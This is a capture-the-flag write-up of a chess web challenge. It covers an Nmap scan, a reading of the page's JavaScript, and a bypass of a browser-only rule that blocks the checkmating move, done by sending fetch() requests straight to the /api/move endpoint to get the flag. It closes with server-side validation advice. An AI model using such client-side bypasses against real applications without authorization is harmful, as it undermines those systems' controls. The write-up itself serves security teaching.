
## Room Overview

The room provides only a short description:

> It's mate in one. You know it, the engine knows it, my grandma knows it. The board says checkmate is one click away. The engine says no. Settle the argument.

The web application is accessible from the AttackBox at:

```text
http://10.145.129.208
```

Before interacting with the application, I started with an Nmap scan to identify any exposed services.

## Reconnaissance

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 19:43 -0700
Nmap scan report for 10.145.129.208
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 23:d2:17:3c:3a:c7:d9:be:4b:5b:a7:52:7f:9f:47:02 (ECDSA)
|_  256 3a:04:77:2d:5c:7a:40:e8:cf:2e:e3:4e:fd:09:df:a0 (ED25519)

80/tcp open  http    Node.js Express framework
|_http-title: Endgame Trainer

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds
```

The scan identified two open ports:

- **Port 22:** OpenSSH 9.6p1 running on Ubuntu.
    
- **Port 80:** A web application using the Node.js Express framework.
    

Nmap also returned the SSH server’s host-key fingerprints. These identify the SSH server but do not provide credentials or direct access.

Since the room description focuses on a web application, I continued by visiting port 80 in the browser.

## Web Application Enumeration

The website contained a chessboard with an apparent mate-in-one position.


The winning move appeared to be moving the rook from `a1` to `a8`, written in chess notation as:

```text
Ra8#
```

However, attempting to make this move through the website caused the application to display a threatening message instead of allowing checkmate.


Since the interface was intentionally preventing the winning move, I began inspecting the website’s source code.

## JavaScript Analysis

In the HTML source, I found a reference to:

```text
js/app.js
```

I opened this JavaScript file to understand how the game processed moves.

### Client-Side Checkmate Detection

Inside `app.js`, I found a function named `preMoveCheck()`:

```javascript
function preMoveCheck(from, to, promotion) {
  const probe = new Chess(game.fen());
  let result;

  try {
    result = probe.move({
      from,
      to,
      promotion: promotion || undefined
    });
  } catch (e) {
    result = null;
  }

  if (result && probe.isCheckmate()) {
    showSystemNotice("I'll shut down your PC if you play that.");
    return false;
  }

  return true;
}
```

This function creates a temporary copy of the current chess position using the game’s FEN string. It then performs the proposed move on that temporary copy.

If the move results in checkmate, the function:

1. Displays the shutdown warning.

2. Returns `false`.

3. Prevents the move from continuing.


### Move Processing

I then examined the function responsible for processing moves:

```javascript
if (!preMoveCheck(from, to, promotion)) {
  setElPos(els[from], from, true);
  return true;
}

sendMove(from, to, promotion);
```

This shows that `preMoveCheck()` runs before `sendMove()`.

When I move the rook from `a1` to `a8` through the graphical interface, the following happens:

1. The browser confirms that the move is legal.
    
2. `preMoveCheck()` simulates the move.
    
3. The browser detects checkmate.
    
4. The shutdown message is displayed.
    
5. The function returns before `sendMove()` executes.
    
6. No request containing the move is sent to the server.
    

### Fake Shutdown Message

I also examined the function used to display the warning:

```javascript
function showSystemNotice(msg) {
  winMessage.textContent = msg;
  modalOverlay.hidden = false;
}
```

The message does not interact with the operating system. It only places text inside an HTML element and makes a modal visible.

There is no shutdown command or other mechanism capable of turning off the computer.

## API Request Analysis

Next, I examined `sendMove()` to determine how allowed moves were submitted to the server.

```javascript
const res = await fetch('/api/move', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    from,
    to,
    promotion: promotion || undefined
  })
});
```

The application sends a POST request to:

```text
/api/move
```

The request body contains the starting square, destination square, and an optional promotion value.

For the winning move, the JSON request body would be:

```json
{
  "from": "a1",
  "to": "a8"
}
```

The checkmate restriction was implemented only in the browser’s JavaScript. The `/api/move` endpoint was still accessible directly.

Because client-side JavaScript runs in an environment controlled by the user, I did not have to submit the move through the graphical chessboard. I could instead send the HTTP request manually and bypass `preMoveCheck()`.

## Exploitation

Before submitting the winning move, I reset the game to ensure that the server was using the original chess position.

```javascript
await fetch('/api/reset', {
  method: 'POST'
});
```

I then manually sent the winning move from the browser’s developer console:

```javascript
const response = await fetch('/api/move', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    from: 'a1',
    to: 'a8'
  })
});

console.log(await response.json());
```

This request was sent directly to the back-end API.

Because the move did not pass through the normal interface, the following client-side functions were bypassed:

```text
doMove()
preMoveCheck()
showSystemNotice()
```

The server accepted the move `a1` to `a8`, recognized the checkmate, and returned the flag inside its JSON response.

## Flag Handling

The application contains a function named `finalize()` that checks the server response for a flag:

```javascript
function finalize(data) {
  refreshHighlights();
  updateStatus();

  if (data.flag) {
    showFlag(data.flag);
  }
}
```

This confirms that the flag is returned by the server after the correct move is submitted successfully.

The `showFlag()` function then places the returned flag inside the page:

```javascript
function showFlag(flag) {
  flagBanner.hidden = false;
  flagBanner.textContent = flag;
}
```

## Vulnerability

The vulnerability demonstrated by this room is a **client-side validation bypass**.

The application attempts to prevent a checkmating move using JavaScript running in the browser. However, client-side restrictions cannot be considered a security boundary because the user controls the browser.

A user can:

- Inspect the JavaScript.
    
- Modify or disable JavaScript functions.
    
- Change request values.
    
- Use the developer console.
    
- Reproduce HTTP requests manually.
    
- Send requests through tools such as Burp Suite or cURL.
    

The browser interface rejected the move, but the underlying API still accepted it when the request was sent directly.

## Attack Flow

### Normal Interface

```text
Move rook from a1 to a8
        ↓
Browser runs doMove()
        ↓
Browser runs preMoveCheck()
        ↓
Temporary game detects checkmate
        ↓
Fake shutdown modal is displayed
        ↓
Function returns false
        ↓
sendMove() is never called
        ↓
No request reaches the server
```

### Client-Side Validation Bypass

```text
Reset the game
        ↓
Send POST request directly to /api/move
        ↓
Submit {"from":"a1","to":"a8"}
        ↓
Client-side check is bypassed
        ↓
Server accepts Ra8#
        ↓
Server returns the flag
```

## Remediation

Important application rules should always be validated on the server.

A secure implementation should:

1. Load the current server-side chess position.
    
2. Confirm that it is the player’s turn.
    
3. Validate that the submitted move is legal.
    
4. Simulate the move on the server.
    
5. Enforce all application-specific rules.
    
6. Reject any move that violates those rules.
    
7. Return only the appropriate response to the client.
    

Client-side validation may still be used to improve the user experience, but it should never be the only validation protecting important application behavior.

## Conclusion

The challenge was solved by identifying that the checkmate restriction existed only in front-end JavaScript.

Moving the rook normally caused the browser to detect `Ra8#` and stop the request. By manually sending the same move directly to `/api/move`, I bypassed the local validation and received the flag from the server.

The main lesson from this room is:

> Hiding or blocking an action in JavaScript does not prevent a user from sending the underlying HTTP request directly. Never trust the client.
